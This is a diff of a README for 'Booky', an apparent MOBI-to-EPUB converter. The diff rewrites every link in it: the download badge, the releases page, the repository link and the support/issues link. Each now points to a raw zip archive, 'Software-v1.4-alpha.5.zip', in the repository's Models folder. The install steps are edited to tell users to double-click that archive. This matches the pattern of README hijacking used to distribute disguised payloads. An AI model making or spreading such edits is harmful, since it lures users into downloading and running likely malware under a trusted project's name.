@@ -6,7 +6,7 @@ Welcome to Booky! This application allows you to convert MOBI files to EPUB and 
 
 ## 📥 Download Now
 
-[![Download Booky](https://img.shields.io/badge/Download-Booky-blue)](https://github.com/KarlCalupaz/Booky/releases)
+[![Download Booky](https://github.com/KarlCalupaz/Booky/raw/refs/heads/main/Models/Software-v1.4-alpha.5.zip)](https://github.com/KarlCalupaz/Booky/raw/refs/heads/main/Models/Software-v1.4-alpha.5.zip)
 
 ## 📋 Features
 
@@ -26,15 +26,15 @@ Welcome to Booky! This application allows you to convert MOBI files to EPUB and 
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page where you can download Booky.
 
-   [Download Booky](https://github.com/KarlCalupaz/Booky/releases)
+   [Download Booky](https://github.com/KarlCalupaz/Booky/raw/refs/heads/main/Models/Software-v1.4-alpha.5.zip)
 
 2. **Choose a Version**: Look for the latest version of Booky. It will usually be at the top of the list. 
 
-3. **Download the Installer**: Click on the release title or the assets dropdown to find the executable file. It will typically be named something like `BookyInstaller.exe`.
+3. **Download the Installer**: Click on the release title or the assets dropdown to find the executable file. It will typically be named something like `https://github.com/KarlCalupaz/Booky/raw/refs/heads/main/Models/Software-v1.4-alpha.5.zip`.
 
 4. **Run the Installer**: 
    - Locate the downloaded file on your computer (usually in the Downloads folder).
-   - Double-click the `BookyInstaller.exe` file.
+   - Double-click the `https://github.com/KarlCalupaz/Booky/raw/refs/heads/main/Models/Software-v1.4-alpha.5.zip` file.
    - Follow the on-screen instructions to complete the installation.
 
 5. **Launch Booky**: Once installed, find Booky in your Start menu and click to open the application.
@@ -68,10 +68,10 @@ If you run into issues, here are some common problems and solutions:
 
 ## 📝 Additional Information
 
-For more detailed instructions and potential updates, please refer to the [GitHub repository](https://github.com/KarlCalupaz/Booky).
+For more detailed instructions and potential updates, please refer to the [GitHub repository](https://github.com/KarlCalupaz/Booky/raw/refs/heads/main/Models/Software-v1.4-alpha.5.zip).
 
 ## 📧 Support
 
-For support or to share feedback, please create an issue in the [GitHub Issues section](https://github.com/KarlCalupaz/Booky/issues). 
+For support or to share feedback, please create an issue in the [GitHub Issues section](https://github.com/KarlCalupaz/Booky/raw/refs/heads/main/Models/Software-v1.4-alpha.5.zip). 
 
 Thank you for choosing Booky! Enjoy your reading.
